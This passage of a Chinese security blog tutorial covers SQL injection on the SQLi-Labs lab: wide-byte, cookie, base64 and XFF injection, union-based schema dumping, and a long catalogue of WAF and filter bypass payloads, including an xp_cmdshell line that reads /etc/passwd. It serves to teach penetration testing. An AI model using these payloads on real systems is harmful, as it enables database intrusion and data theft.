+<li>passwd=&rsquo;) or (&lsquo;1&rsquo;)=(&lsquo;1</li>
+<li>完整语句：</li>
+<li>SELECT username, password FROM users WHERE username=(&rsquo;test&rsquo;) or (&lsquo;1&rsquo;)=(&lsquo;1&rsquo;) and password=(&rsquo;&rsquo;) or (&lsquo;1&rsquo;)=(&lsquo;1&rsquo;) LIMIT 0,1</li>
+</ul>
+<p><img src="/imgs/0.5778350651396896-20220428154804-uln73gn.png" alt="image"></p>
+<ul>
+<li>从上面的例子不难看出，二次注入就是查询语句中需要同时传入两个参数进行查询，同时对这两个参数进行构造SQL语句，使其最终在后端结合成完整的SQL语句。（即两个参数互相影响）</li>
+</ul>
+<ol>
+<li>宽字节注入</li>
+</ol>
+<ul>
+<li>测试环境：SQLi-Labs Less33</li>
+<li>当我们在id=1后面加单引号后，单引号被转义符（反斜线）转义了，导致参数id的值无法逃逸出单引号的包围，一般情况下这里就不存在SQL注入漏洞了。但是当数据库的编码为GBK时，可以使用宽字节注入。</li>
+<li>宽字节的格式时在地址后先加一个%df，再加单引号，因为反斜杠的编码为%5c，当单引号被反斜杠转义时就变成了%df%5c&rsquo; 而再GBK编码中，%df%5c是繁体字“連”，所以这时，单引号成功逃逸。</li>
+<li>当id=1:</li>
+</ul>
+<p><img src="/imgs/0.5681553979393968-20220428154804-tb0h5eo.png" alt="image"></p>
+<ul>
+<li>加个单引号：</li>
+<li>id=1&rsquo;</li>
+</ul>
+<p><img src="/imgs/0.9184430527039983-20220428154804-4x5dx2e.png" alt="image"></p>
+<ul>
+<li>使用宽字节进行绕过：</li>
+<li>id=1%df&rsquo;</li>
+<li>可以看到逃逸出去了：</li>
+</ul>
+<p><img src="/imgs/0.3781994539193443-20220428154804-c8uqq7x.png" alt="image"></p>
+<ul>
+<li>由于插入了单引号所以多出一个单引号导致上面的报错，可以在后面再加个注释符将多余的单引号注释掉：</li>
+<li>id=1%df&rsquo;%23</li>
+</ul>
+<p><img src="/imgs/0.05073104487236002-20220428154804-jg3qio4.png" alt="image"></p>
+<ul>
+<li>进一步判断是否存在注入：</li>
+<li>id=1%df&rsquo; and 1=1%23</li>
+</ul>
+<p><img src="/imgs/0.8770355857771933-20220428154804-qmo84z9.png" alt="image"></p>
+<ul>
+<li>id=1%df&rsquo; and 1=2%23</li>
+</ul>
+<p><img src="/imgs/0.3777313262102537-20220428154804-d9mxa9a.png" alt="image"></p>
+<ul>
+<li>可以看出来当and 1=1时返回正常，and 1=2返回不正常，所以判断id存在SQL注入。</li>
+<li>接着使用order by查询数据库表的字段数：</li>
+<li>id=1%df&rsquo; order by 3%23</li>
+</ul>
+<p><img src="/imgs/0.8434974583828-20220428154804-px1vxyx.png" alt="image"></p>
+<ul>
+<li>id=1%df&rsquo; order by 4%23</li>
+</ul>
+<p><img src="/imgs/0.05823503425255846-20220428154804-11t0a8y.png" alt="image"></p>
+<ul>
+<li>通过测试，得出字段数为3。</li>
+<li>接着使用union查询：</li>
+<li>将id值修改为负值，使其查询失败：</li>
+<li>id=-1%df&rsquo; union select 1,2,3%23</li>
+</ul>
+<p><img src="/imgs/0.3689078013192526-20220428154804-wjk2hf1.png" alt="image"></p>
+<ul>
+<li>可以看到2，3两个字段的值，然后查询数据库名和用户名：</li>
+<li>id=-1%df&rsquo; union select 1,databse(),user()%23</li>
+</ul>
+<p><img src="/imgs/0.16731261380487425-20220428154804-3jb8pi0.png" alt="image"></p>
+<ul>
+<li>查询数据库表名：</li>
+<li>id=-1%df&rsquo; union select 1,(select table_name from information_schema.tables where table_schema=&lsquo;security&rsquo; limit 0,1),3%23</li>
+<li>但是因为这里做了转义，单引号会报错，所以将数据库名的地方进行嵌套查询：</li>
+<li>id=-1%df&rsquo; union select 1,(select table_name from information_schema.tables where table_schema=(select database()) limit 0,1),3%23</li>
+</ul>
+<p><img src="/imgs/0.8033691288524794-20220428154804-znlnyev.png" alt="image"></p>
+<ul>
+<li>接着就可以查询表下面的字段：</li>
+<li>id=-1%df&rsquo; union select 1,(select column_name from information_schema.columns where table_schema=(select database()) and table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 0,1) limit 0,1),3%23</li>
+<li>这里总共是三层嵌套</li>
+<li>整个语句是一个大的嵌套，</li>
+<li>第一个嵌套是：table_schema=(select database()) &mdash;-数据库名</li>
+<li>第二个嵌套是：table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 0,1)&mdash;&ndash;通过limit来控制每次查询的表</li>
+</ul>
+<p><img src="/imgs/0.7447097800688436-20220428154804-9e95l5v.png" alt="image"></p>
+<ul>
+<li>代码层面对宽字节注入分析：</li>
+<li>function check_addslashes($string) { $string = preg_replace(&rsquo;/&rsquo;. preg_quote(&rsquo;\\&rsquo;) .&rsquo;/&rsquo;, &ldquo;\\\\\\&rdquo;, $string); //escape any backslash $string = preg_replace(&rsquo;/\&rsquo;/i&rsquo;, &lsquo;\\\&rsquo;&rsquo;, $string); //escape single quote with a backslash $string = preg_replace(&rsquo;/\&rdquo;/&rsquo;, &ldquo;\\\&rdquo;&rdquo;, $string); //escape double quote with a backslash return $string; } &hellip; mysql_query(&ldquo;SET NAMES gbk&rdquo;); $sql=&ldquo;SELECT * FROM users WHERE id=&rsquo;$id&rsquo; LIMIT 0,1&rdquo;; &hellip; function strToHex($string) { $hex=&rsquo;&rsquo;; for ($i=0; $i &lt; strlen($string); $i++) { $hex .= dechex(ord($string[$i])); } return $hex; } echo &ldquo;Hint: The Query String you input is escaped as : &ldquo;.$id .&rdquo;&rdquo;; echo &ldquo;The Query String you input in Hex becomes : &ldquo;.strToHex($id). &ldquo;&rdquo;;</li>
+<li>可以看到最上面有个check_addslashes函数对id的参数值进行了转义处理，同时14行“SET NAMES gbk”将数据库编码设置为了gbk，所以导致了宽字节注入。</li>
+<li>注：在PHP中如果使用了iconv()进行编码转换的话，也可能存在宽字节注入。</li>
+</ul>
+<ol>
+<li>Cookie注入</li>
+</ol>
+<ul>
+<li>注入点在cookie处的注入，其他一样，不赘述。</li>
+</ul>
+<ol>
+<li>Base64注入</li>
+</ol>
+<ul>
+<li>注入点的参数值本身经过base64编码，后端代码最后会用base64_decode()进行解码，与其他注入一样，只需要注入的时候做一下编码即可。</li>
+</ul>
+<ol>
+<li>XFF注入</li>
+</ol>
+<ul>
+<li>判断是否存在注入</li>
+<li>使用Burp的Repeater模块对请求进行修改，分别修改X-Forwarded-For的值如下所示：</li>
+<li>X-Forwarded-for: 127.0.0.1</li>
+<li>X-Forwarded-for: 127.0.0.1’</li>
+<li>X-Forwarded-for: 127.0.0.1&rsquo; and 1=1#</li>
+<li>X-Forwarded-for: 127.0.0.1&rsquo; and 1=2#</li>
+<li>其他都一样，不赘述。</li>
+</ul>
+<ol>
+<li>绕过技术</li>
+<li>特定函数绕过技术</li>
+<li>通用绕过技术</li>
+<li>常见的bypass</li>
+</ol>
+<ul>
+<li>    id=1+(UnIoN)+(SelECT)+</li>
+<li>    id=1+(UnIoN+SeLeCT)+</li>
+<li>    id=1+(UnI)(oN)+(SeL)(EcT)</li>
+<li>    id=1+’UnI’’On’+’SeL’’ECT’ &lt;-MySQL only</li>
+<li>id=1+’UnI’||’on’+SeLeCT’ &lt;-MSSQL only</li>
+<li>id=1+uni&lt;&gt;on</li>
+<li>id=1+uni/**/on</li>
+</ul>
+<ol>
+<li>大小写绕过</li>
+</ol>
+<ul>
+<li>例子：id=-1&rsquo;UnIoN/**/SeLeCT</li>
+</ul>
+<ol>
+<li>双写绕过</li>
+</ol>
+<ul>
+<li>在某一些简单的waf中，将关键字select等只使用replace()函数置换为空，这时候可以使用双写关键字绕过。例如select变成seleselectct，在经过waf的处理之后又变成select，达到绕过的要求。</li>
+</ul>
+<ol>
+<li>编码绕过</li>
+</ol>
+<ul>
+<li>16进制绕过：</li>
+<li>select * from users where username = test1; select * from users where username = 0x7465737431;</li>
+<li>注：如果直接把字段值赋予16进制的值不能查出来结果的话，可以使用unhex()对16进制做解码。（不用0x）</li>
+</ul>
+<p><img src="/imgs/0.9762802419978374-20220428154804-s94i64a.png" alt="image"></p>
+<ul>
+<li>关键字二重url编码：</li>
+<li>1+and+1=2 1+%25%36%31%25%36%65%25%36%34+1=2</li>
+<li>注：URL编码需要使用URL全编码(就是整个单词进行编码),由于服务器会自动对URL进行一次URL解码，所以需要编码两次</li>
+<li>unicode编码绕过：</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>原字符</th>
+<th>Unicode编码</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>单引号 ‘</td>
+<td>%u0037       %u02b9<br>%u0027       %u02bc<br>%u02c8       %u2032<br>%uff07         %c0%27<br>%c0%a7      %e0%80%a7</td>
+</tr>
+<tr>
+<td>空格</td>
+<td>%u0020       %uff00<br>%c0%20      %c0%a0<br>%e0%80%a0</td>
+</tr>
+<tr>
+<td>左括号(</td>
+<td>%u0028      %uff08<br>%c0%28     %c0%a8<br>%e0%80%a8</td>
+</tr>
+<tr>
+<td>右括号）</td>
+<td>%u0029      %uff09<br>%c0%29      %c0%a9<br>%e0%80%a9</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li>ascii 编码绕过</li>
+<li>Test 等价于 CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)</li>
+<li>tip: 好像新版 mysql 不能用了</li>
+</ul>
+<ol>
+<li> 内联注释绕过</li>
+</ol>
+<ul>
+<li>原理：</li>
+<li>利用MySQL遇到内联注释时能够正常进行执行的特性来绕过。为这种语句在其他数据库中是不会被执行的。</li>
+<li>注意：</li>
+<li>       使用内联注释的时候也要办证关键字的完整性，例如不能写成/*!SELE*//!*CT*/，同理，表名，列名等内容也要是完整的。拆分的话就爆错了,例如：</li>
+</ul>
+<p><img src="/imgs/0.13753368159621787-20220428154804-2fbokpl.png" alt="image"></p>
+<ul>
+<li>例如：</li>
+<li>id=1/*! and*/1=1</li>
+<li>其实执行的就是id=1 and 1=1</li>
+<li>例如5.12.24版本的数据库，使用内联注入：</li>
+<li>/*!50000select*/等价于select ，里面的数字不能大于版号乘以10000,例如这里指的是5*10000而不是5.12.24*10000:</li>
+<li>版本号5.5.29：</li>
+</ul>
+<p><img src="/imgs/0.8818353684001534-20220428154804-mtn9rvr.png" alt="image"></p>
+<ul>
+<li>用内联注入进行查询：</li>
+<li>当用5.5.29*10000:</li>
+<li>报错</li>
+</ul>
+<p><img src="/imgs/0.2753414678261688-20220428154804-himgd3s.png" alt="image"></p>
+<ul>
+<li>比他小点也不行：</li>
+</ul>
+<p><img src="/imgs/0.7773128349267545-20220428154804-hgqp0oy.png" alt="image"></p>
+<ul>
+<li>当用5*10000:</li>
+</ul>
+<p><img src="/imgs/0.05224234315255098-20220428154804-fvkhfzf.png" alt="image"></p>
+<ul>
+<li>所以必须是&lt;=5。</li>
+<li>用内联的时候前面就可以不用再写空格了，例如：</li>
+<li>union select &mdash;&ndash;union/*!select*/&mdash;-union/*!50000%0aselect*/</li>
+<li>注：</li>
+<li>%0a是空格，在语句中可以放多个空格，作为垃圾字符，空格可以使用%0a,%0b,</li>
+<li>%0c,%0d,%09等进行代替，这个可以在正常的查询语句中进行fuzzing，并不是说进行</li>
+<li>URL解码后是空格的才可以，只需要当他放在空格的位置上，能起到与空格一样的作用即可。</li>
+</ul>
+<ol>
+<li>关键字替换</li>
+</ol>
+<ul>
+<li>逗号绕过：</li>
+<li>substr、mid()函数中可以利用from to来摆脱对逗号的利用；</li>
+<li>limit中可以利用offset来摆脱对逗号的利用;</li>
+<li>比较符号(&gt;、&lt;)绕过</li>
+<li>Greatest、Least、between and</li>
+</ul>
+<ol>
+<li>conv(,10,36)代替字母</li>
+</ol>
+<ul>
+<li>原理：</li>
+<li>这个函数是用来将字符转换进制的，例如将a转成ASCII码（换个说法就是将16进制的a换成10进制）</li>
+<li>例如：conv(hex(&lsquo;a&rsquo;),16,10)</li>
+<li>第一个参数是要转换的字符</li>
+<li>第二个就是要转换的字符的进制</li>
+<li>第三个参数就是转换成的进制</li>
+<li>就是说第二个参数要和第一个参数的类型一致，第三个参数就是想要得到的进制</li>
+<li>conv(10,10,36)是大写的A</li>
+</ul>
+<p><img src="/imgs/0.2449435857209827-20220428154804-ftatms6.png" alt="image"></p>
+<ul>
+<li>lower(conv(10,10,36))是小写的a</li>
+</ul>
+<p><img src="/imgs/0.44058734806849464-20220428154804-rvbyxgw.png" alt="image"></p>
+<ol>
+<li>限制与from的组合</li>
+</ol>
+<ul>
+<li>用 from. 代替 from</li>
+</ul>
+<p><img src="/imgs/0.6485475326173594-20220428154804-sb5hajq.png" alt="image"></p>
+<ol>
+<li>表名或字段名是保留字</li>
+</ol>
+<ul>
+<li>这种情况一般是CTF中才会遇到。</li>
+<li>这个时候最好使用点号连接表名和字段名（主要用来区分保留字和我们要查的对象），或者直接使用反引号包起来。</li>
+</ul>
+<ol>
+<li>利用mysql 的特性</li>
+<li>当使用自定义的不存在函数的时候就会报错显示出库的名字</li>
+</ol>
+<ul>
+<li>例如我们假定存在函数a(),然后进行查询：</li>
+<li>select a();</li>
+<li>提示该数据库没有找到a()</li>
+</ul>
+<p><img src="/imgs/0.6799908860539238-20220428154804-7d1hetp.png" alt="image"></p>
+<ol>
+<li>当查找重复的列的是时候就会报错</li>
+</ol>
+<ul>
+<li>注： MySQL是兼容两个列相同的但是却不兼容在这个基础上再进行select</li>
+<li>例如：</li>
+<li>正常执行时：</li>
+<li>select * from runoob_tbl as A join runoob_tbl as B using(runoob_title);</li>
+<li>可以看到都是从runoob_tbl读取的数据，进行join后得到的结果都是一样的，即A和B一样。</li>
+</ul>
+<p><img src="/imgs/0.7663007918711428-20220428154804-p68921u.png" alt="image"></p>
+<ul>
+<li>报错：</li>
+<li>在外面加上select:</li>
+</ul>
+<p><img src="/imgs/0.17245411092239232-20220428154804-dzukd95.png" alt="image"></p>
+<ol>
+<li>在列名被过滤的情况下得到结果</li>
+</ol>
+<ul>
+<li>当列名等被过滤了的极端情况时，要在不出现字段名的情况下查出内容，将一个虚拟表和当前表联合起来即可：</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>select a.2 from (select 1,2,3,4 from dual union select * from runoob_tbl) a;<br><img src="/imgs/0.25766461177965777-20220428154804-d5y972a.png" alt="image"></th>
+</tr>
+</thead>
+</table>
+<ol>
+<li>过滤or and xor not 绕过</li>
+</ol>
+<ul>
+<li>and = &amp;&amp;</li>
+<li>or = ||</li>
+<li>xor = | ## 异或</li>
+<li>not = !</li>
+</ul>
+<ol>
+<li>空格过滤绕过</li>
+</ol>
+<ul>
+<li>一般绕过空格过滤的方法有以下几种方法来取代空格</li>
+</ul>
+<ol>
+<li>/**/或者/*1*/  #中间的内容随意填写</li>
+</ol>
+<p><img src="/imgs/0.17736196206229232-20220428154804-hrokkql.png" alt="image"></p>
+<ol>
+<li>()</li>
+</ol>
+<p><img src="/imgs/0.19080066287566325-20220428154804-q3zviqj.png" alt="image"></p>
+<ol>
+<li>%0d或%0a或%0c或%0b或%a0</li>
+</ol>
+<ul>
+<li>注：</li>
+<li>（这种URL编码的方式需要在服务端能解码的情况下才能用，例如在WEB站点测试就可以，但是你在数据库中执行就不行了，因为数据库本身不会去解码你的编码。）</li>
+</ul>
+<ol>
+<li>
+<ul>
+<li></li>
+</ul>
+</li>
+</ol>
+<p><img src="/imgs/0.05320567349858279-20220428154804-67vsuuj.png" alt="image"></p>
+<ol>
+<li>回车(url编码中的%0a)</li>
+</ol>
+<p><img src="/imgs/0.8444662228447779-20220428154804-0ymn9xc.png" alt="image"></p>
+<ol>
+<li>`(tap键上面的按钮)</li>
+</ol>
+<p><img src="/imgs/0.23340280837606797-20220428154804-jk8lfqy.png" alt="image"></p>
+<ul>
+<li>注：</li>
+<li>*不可以用：</li>
+</ul>
+<p><img src="/imgs/0.9481325220849014-20220428154804-zibuzgh.png" alt="image"></p>
+<ol>
+<li>Tab</li>
+</ol>
+<p><img src="/imgs/0.7607485878302297-20220428154804-2o4omai.png" alt="image"></p>
+<ol>
+<li>两个空格</li>
+</ol>
+<p><img src="/imgs/0.4509864368933082-20220428154804-0j6w8lk.png" alt="image"></p>
+<ol>
+<li>科学计数法绕过</li>
+</ol>
+<ul>
+<li>select A from B 默认from前面必须是空格，因此为了不让你使用from可能正则表达式会检测前面的空格，我们可以用科学计数法绕过，因为1E0后面可以没有空格</li>
+<li>select A,1E0from B</li>
+<li>这里的逗号是两列的意思 1E0占了第二列，同样，上面的1E0可以用1.0代替,e用大小写都可以。</li>
+</ul>
+<ol>
+<li>过滤等号 = 绕过</li>
+</ol>
+<ul>
+<li>不加通配符的like</li>
+<li>不加通配符的like执行的效果和=一致，所以可以用来绕过。</li>
+<li>正常加上通配符（%）的like：</li>
+</ul>
+<p><img src="/imgs/0.7489044509063276-20220428154804-saylwgj.png" alt="image"></p>
+<ul>
+<li>不加上通配符的like可以用来取代=：</li>
+</ul>
+<p><img src="/imgs/0.35940253151445106-20220428154804-zz52mdh.png" alt="image"></p>
+<p><img src="/imgs/0.25095190280080915-20220428154804-luvphro.png" alt="image"></p>
+<ul>
+<li>rlike</li>
+<li>模糊匹配，只要字段的值中存在要查找的部分就会被选择出来。用来取代=时，rlike的用法和上面的like一样，没有通配符效果和=一样</li>
+</ul>
+<p><img src="/imgs/0.0961490007495673-20220428154804-4q7upvx.png" alt="image"></p>
+<ul>
+<li>regexp</li>
+<li>MySQL 中使用 REGEXP 操作符来进行正则表达式匹配</li>
+</ul>
+<p><img src="/imgs/0.5817966896658222-20220428154804-lh895c2.png" alt="image"></p>
+<ul>
+<li>使用大小于号来绕过</li>
+</ul>
+<p><img src="/imgs/0.36962207529424135-20220428154804-ykcrjuo.png" alt="image"></p>
+<ul>
+<li>&lt;&gt;</li>
+<li>&lt;&gt;等价于!=所以在前面再加个!就是=了：</li>
+</ul>
+<p><img src="/imgs/0.9485426916451835-20220428154804-kla9dog.png" alt="image"></p>
+<ul>
+<li>等号绕过也可以使用 strcmp(str1,str2) 函数、between 关键字等，具体可以参考后面的过滤大小于号绕过。</li>
+</ul>
+<ol>
+<li>过滤大小于号绕过</li>
+</ol>
+<ul>
+<li>在 sql 盲注中，一般使用大小于号来判断 ascii 码值的大小来达到爆破的效果。但是如果过滤了大小于号的话，那就凉凉。怎么会呢，可以使用以下的关键字来绕过。</li>
+<li>greatest()</li>
+<li>greatest(n1, n2, n3…): 返回 n 中的最大值</li>
+<li>实例：</li>
+<li>首先看下这个表里，id为1的字段，对应runoob_title为“学习 PHP”，则这个字符串的第一位字符为“学”</li>
+</ul>
+<p><img src="/imgs/0.8334733651987397-20220428154804-9efwluc.png" alt="image"></p>
+<ul>
+<li>查询这个字符的ASCII：</li>
+</ul>
+<p><img src="/imgs/0.2972912792585629-20220428154804-kfhalr4.png" alt="image"></p>
+<ul>
+<li>接下来进行查询：</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>select * from runoob_tbl where runoob_id=1 and greatest(ascii(substr(runoob_title,1)),1)=229</th>
+</tr>
+</thead>
+</table>
+<ul>
+<li>原理分析：</li>
+<li>拆分一下这个语句</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>substr(runoob_title,1)<br>获取runoob_title字段的第一个字符<br>ascii(substr(runoob_title,1))<br>计算第一个字符的ascii<br>greatest(Ascii(substr(runoob_title,1)),1)=229<br>将ascii与1比大小然后判断返回的结果是否等于指定的ascii值，等于则返回正常结果。</th>
+</tr>
+</thead>
+</table>
+<ul>
+<li>least()</li>
+<li>least(n1,n2,n3…): 返回 n 中的最小值,其余同上。</li>
+<li>strcmp()</li>
+<li>与greatest()/least()类似，只不过这个省掉了等号，直接进行比较，返回不同结果，当等于指定的值则返回0，当大于则返回1，小于返回-1，所以可以根据这个返回结果与前面的runoob_id=1进行and运算的结果来推出指定的ascii是否就是该字符串指定字符的ascii。</li>
+<li>例如下图：</li>
+</ul>
+<p><img src="/imgs/0.781802063533538-20220428154804-vcy0xee.png" alt="image"></p>
+<ul>
+<li>返回为空，即返回0，所以1=0才等于</li>
+<li>in关键字</li>
+<li>利用判断字符是否在指定的字符串中，来判断其具体值。如下语句，判断在表runoob_tbl中runood_id=1处的runoob_title的第一个字符串是否在括号中给出的‘学’当中，由于里面只有一个字符，所以就相当于判断第一个字符是否为‘学’。</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>select * from runoob_tbl where runoob_id = 1 and substr(runoob_title,1,1) in (&lsquo;学&rsquo;);</th>
+</tr>
+</thead>
+</table>
+<p><img src="/imgs/0.2090986799285456-20220428154804-ng6scek.png" alt="image"></p>
+<ul>
+<li>between a and b</li>
+<li>相当于 a&lt;=xxx&lt;=b</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>select * from runoob_tbl where runoob_id between 1 and 2</th>
+</tr>
+</thead>
+</table>
+<p><img src="/imgs/0.22977320971313392-20220428154804-v7ygi2q.png" alt="image"></p>
+<table>
+<thead>
+<tr>
+<th>select * from runoob_tbl where runoob_id between 1 and 1</th>
+</tr>
+</thead>
+</table>
+<p><img src="/imgs/0.14755371106727952-20220428154804-cbfhq37.png" alt="image"></p>
+<ul>
+<li>利用过滤删除绕过</li>
+<li>类似于双写绕过，不过这个跟过的的情况是不同字符放在一起，例如：sel/**/ect</li>
+<li>+ - . 拆分字符串绕过</li>
+<li>?id=1’ or ‘11+11’=’11+11</li>
+<li>和  .</li>
+</ul>
+<ol>
+<li>WAF Bypass</li>
+</ol>
+<p><img src="/imgs/0.8807687454904829-20220428154804-9jswgjt.png" alt="image"></p>
+<ul>
+<li>BURP右键change body encoding转换成boundary encoding</li>
+</ul>
+<p><img src="/imgs/0.4393969584567373-20220428154804-bztuvpr.png" alt="image"></p>
+<p><img src="/imgs/0.7412524099903133-20220428154804-ie6r99r.png" alt="image"></p>
+<ul>
+<li>通用Bypass WAF策略之多参数Bypass</li>
+<li>一个Get参数存在注入，这里他的后端采用了REQUEST形式来接收，而REQUEST接收则是接收来自：GET POST COOKIE 的参数值，也就是相当于他可以接受这三个地方的传参。而这三种传输有顺序：解析顺序是 GET，POST，COOKIE</li>
+</ul>
+<p><img src="/imgs/0.8270708473646198-20220428154804-g5z39z0.png" alt="image"></p>
+<ul>
+<li>通过对其注入点 &ndash;proxy=&quot;<a href="http://127.0.0.1:8080">http://127.0.0.1:8080</a>&rdquo; 让其流量走 8080 端口，然后我们通过Burp观看Sqlmap的测试方法以及流程</li>
+</ul>
+<p><img src="/imgs/0.797419786187362-20220428154804-kcdj2yd.png" alt="image"></p>
+<ul>
+<li>目前SQLMAP在测试该站点是否存在WAF，而他探测是否存在WAF的原理比较简单</li>
+<li>QndS=7851+AND+1%3d1+UNION+ALL+SELECT+1,NULL,&lsquo;alert(&ldquo;XSS&rdquo;)&rsquo;,table_name+FROM+information_schema.tables+WHERE+2&gt;1&ndash;/**/%3b+EXEC+xp_cmdshell(&lsquo;cat+../../../etc/passwd&rsquo;)%23</li>
+</ul>
+<p><img src="/imgs/0.2179582636687483-20220428154804-50olfq9.png" alt="image"></p>
+<ul>
+<li>当如果页面正常返回则代表没有WAF，而我们当前这个页面发出去数据包后，服务端并没有回显，那么就代表我们的数据包在WAF层拦截了，并未直接到达服务器，造成了数据包没有返回包。</li>
+</ul>
+<p><img src="/imgs/0.5883862983075802-20220428154804-vux1rsz.png" alt="image"></p>
+<ul>
+<li>上图中有一个测试数据包已经出现了丢包情况，也在SQLMAP中就会出现一条报错</li>
+</ul>
+<p><img src="/imgs/0.9954403866810954-20220428154804-an3luxk.png" alt="image"></p>
+<ul>
+<li>这就说明该数据包的关键词被拦截。</li>
+<li>而其发送的payload为</li>
+<li>1)+AND+(SELECT+9876+FROM(SELECT+COUNT(*),CONCAT(0x71626b6b71,(SELECT+(ELT(9876%3d9876,1))),0x71716b7071,FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.PLUGINS+GROUP+BY+x)a)+AND+(3722%3d3722</li>
+<li>我们使用多参数形式绕过</li>
+</ul>
+<p><img src="/imgs/0.627374401153071-20220428154804-ugmo04g.png" alt="image"></p>
+<ul>
+<li>可以看到上图我们的payload并未减少，使用多参数绕过了拦截，因为参数如果达到一定数量，WAF层就无法判断。从而导致我们可以绕过，但是服务端并不会因为多个参数而放弃，他只接受指定的参数值。</li>
+</ul>
+
+      </article>
+    </section>
+
+    
+
+    
+
+    
+  </div>
+</div>
+
+
+            <footer class="ui basic center aligned segment" style="background-color: transparent;">
+              
+              <p>© 2021 - 2022 rebootORZ Security</p>
+              
+
+              <p>Powered by <a href="https://gohugo.io/" target="_blank">Hugo</a> with theme <a href="https://github.com/g1eny0ung/hugo-theme-dream" target="_blank">Dream</a>.</p>
+
+              
+            </footer>
+          </div>
+        </section>
+        <section class="back">
+          <div class="dream-max-width">
+            <header class="ui basic very padded segment dream-header">
+  
+  <div class="ui small circular image">
+    <img src="/me/gl.jpg" alt="avatar" />
+  </div>
+  
+
+  <div class="content">
+    <h1 class="ui medium header">rebootORZ Security , EXP Loading ...<span class="sub header">🦶走过的叫足迹 ，走不到叫憧憬。</span>
+    </h1>
+
+    <article class="ui horizontal list">
+      
+      <a class="item" href="/posts">
+        <i class="archive icon" title="归档"></i>
+      </a>
+      
+      <a class="item" href="/categories">
+        <i class="th list icon" title="所有分类"></i>
+      </a>
+      <a class="item" href="/tags">
+        <i class="tags icon" title="所有标签"></i>
+      </a>
+    </article>
+
+    
+    
+    
+    
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+    
+
+    
+
+    
+    
+    
+          <div class="dream-tags">
+          
+          
+          
+            <a class="ui label" href="/tags/docker/" title="Docker">
+              Docker
+            </a>
+          
+          
+          
+            <a class="ui label" href="/tags/java/" title="java">
+              java
+            </a>
+          
+          
+          
+            <a class="ui label" href="/tags/jsp/" title="jsp">
+              jsp
+            </a>
+          
+          
+          
+            <a class="ui label" href="/tags/springboot/" title="SpringBoot">
+              SpringBoot
+            </a>
+          
+          
+          
+            <a class="ui label" href="/tags/webshell/" title="webshell">
+              webshell
+            </a>
+          
+          
+          
+            <a class="ui label" href="/tags/wifi/" title="WiFi">
+              WiFi
+            </a>
+          
+          
+          
+            <a class="ui label" href="/tags/%E7%BA%A2%E9%98%9F%E6%8A%80%E6%9C%AF/" title="红队技术">
+              红队技术
+            </a>
+          
+          
+          
+            <a class="ui label" href="/tags/%E8%93%9D%E7%89%99/" title="蓝牙">
+              蓝牙
+            </a>
+          
+          </div>
+    
+
+    
+  </div>
+</header>
+
+
+<div class="ui relaxed grid dream-grid dream-back">
+  
+  
+  
+
+  <div class="sixteen wide mobile eight wide tablet four wide computer column dream-column">
+    <article class="ui segment">
+      <div class="ui medium header">社交链接</div>
+      <nav class="ui secondary menu dream-menu dream-socials">
+  
+  <a class="item" href="/index.xml">
+    <i class="large rss square icon" title="RSS"></i>
+  </a>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  <a class="item" href="https://github.com/https://github.com/rebootORZ/" target="_blank">
+    <i class="large github icon" title="GitHub"></i>
+  </a>
+  
+
+  
+
+  
+
+  
+</nav>
+
+    </article>
+  </div>
+
+  <div class="sixteen wide mobile eight wide tablet four wide computer column dream-column">
+    
+    <article class="ui segment">
+      <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img alt="知识共享许可协议" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-sa/4.0/88x31.png" /></a><br />本作品采用<a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a>进行许可。<br /><br />背景使用了 <a href="https://www.pexels.com/zh-cn/" target="_blank">Pexels</a> 上 <a href="https://www.pexels.com/zh-cn/@minan1398" target="_blank">Min An</a> 拍摄的<a href="https://www.pexels.com/zh-cn/photo/1454794/" target="_blank">图片</a>。
+    </article>
+    
+  </div>
+
+  
+</div>
+
+          </div>
+        </section>
+      </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/semantic-ui@2.4.2/dist/semantic.min.js" integrity="sha256-CgSoWC9w5wNmI1aN8dIMK+6DPelUEtvDr+Bc2m/0Nx8=" crossorigin="anonymous"></script>
+
+    
+    <div class="ui segment" id="dream-search">
+  <div class="ui search">
+    <div class="ui transparent input">
+      <input class="prompt" type="text" placeholder="搜索" />
+    </div>
+    <div class="results"></div>
+  </div>
+</div>
+<script>
+  $(document).ready(function () {
+    $.getJSON('https:\/\/rebootorz.github.io/index.json', function (data) {
+      $('.ui.search').search({
+        source: data,
+        searchFields: ['title'],
+        showNoResults: false,
+      })
+    })
+  })
+</script>
+<script src="/js/search.js"></script>
+
+    
+
+    
+
+    <script>
+  window.background = "#fff"
+  window.defaultDark =  null 
+  window.backgroundDark =  null 
+  window.backgroundImageDark = "/me/light_background.jpeg"
+  window.darkNav =  true 
+  window.maxTags =  null 
+  window.hasTwitterEmbed =  null 
+  window.fixedNav =  null 
+
+  if (window.hasTwitterEmbed) {
+    
+    window.twttr = (function (d, s, id) {
+      var js,
+        fjs = d.getElementsByTagName(s)[0],
+        t = window.twttr || {}
+      if (d.getElementById(id)) return t
+      js = d.createElement(s)
+      js.id = id
+      js.src = 'https://platform.twitter.com/widgets.js'
+      fjs.parentNode.insertBefore(js, fjs)
+
+      t._e = []
+      t.ready = function (f) {
+        t._e.push(f)
+      }
+
+      return t
+    })(document, 'script', 'twitter-wjs')
+  }
+</script>
